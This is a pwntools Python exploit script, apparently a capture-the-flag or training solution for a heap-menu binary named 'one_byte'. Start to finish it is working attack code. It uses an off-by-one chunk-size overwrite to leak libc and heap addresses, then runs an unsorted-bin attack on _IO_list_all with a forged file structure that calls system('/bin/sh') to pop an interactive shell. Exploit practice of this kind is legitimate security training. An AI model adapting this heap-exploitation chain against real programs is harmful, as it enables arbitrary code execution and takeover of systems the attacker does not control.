#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("one_byte")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option.
# Returns chunk index.
def malloc():
    global index
    io.sendthen(b"> ", b"1")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Select the "read" option; read 0x58 bytes.
def read(index):
    io.send(b"4")
    io.sendafter(b"index: ", f"{index}".encode())
    r = io.recv(0x58)
    io.recvuntil(b"> ")
    return r

io = start()
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# Request a chunk.
chunk_A = malloc()
chunk_B = malloc()   
chunk_C = malloc()
chunk_D = malloc()
chunk_E = malloc() # Guard

# Edit chunk A.
edit(chunk_A, b"\xc1"*0x59)

# Free chunk B.
free(chunk_B)

# B now in unsorted bin
# remaindering process
chunk_B = malloc()

# Chunk C now holds fd and bk 
leaked = read(chunk_C)
fd = u64(leaked[:8])
bk = u64(leaked[8:16])
info("fd: " + hex(fd))
info("bk: " + hex(bk))

# unsortedbin is + 88
libc.address = fd - 88 - libc.sym["main_arena"]
info(f"puts: {hex(libc.sym['puts'])}")

# fastbin dup, E will overlap with C
chunk_F = malloc()

free(chunk_A)
free(chunk_F)

leaked = read(chunk_C)
heap = u64(leaked[:8])
info(f"heapbase: {hex(heap)}")

# Reset heap state
chunk_F = malloc()
chunk_A = malloc()

# Off by one
edit(chunk_A, b"\xc1" * 0x59)

# Trigger remainder again
free(chunk_B)
chunk_B = malloc()

# Overwrite BK so it points to _IO_list_all
# Craft file stream in chunk C
fd = 0xdeadbeef
bk = libc.sym["_IO_list_all"] - 0x10
flags = b"/bin/sh\x00"
overflow = libc.sym["system"]
write_base = 1
write_ptr = 2
mode = 0
vtable_ptr = heap + 0x178

# smallbin b0 -> _IO_list_all chain chain
# edit(chunk_B, b"\x00"*0x50 + flags + b"\xb0")

# Set the 4th bit etc to pass exact fit
edit(chunk_B, b"\x00"*0x50 + flags + b"\x6f")

# Overwrite fd, bk and the base, ptr
payload = flat(
  fd,
  bk,
  write_base,
  write_ptr
)

edit(chunk_C, payload)

payload = flat(
  overflow, 
  vtable_ptr
)

edit(chunk_E, payload)

# Trigger unsorted bin attack
chunk_G = malloc()
# =============================================================================

io.interactive()
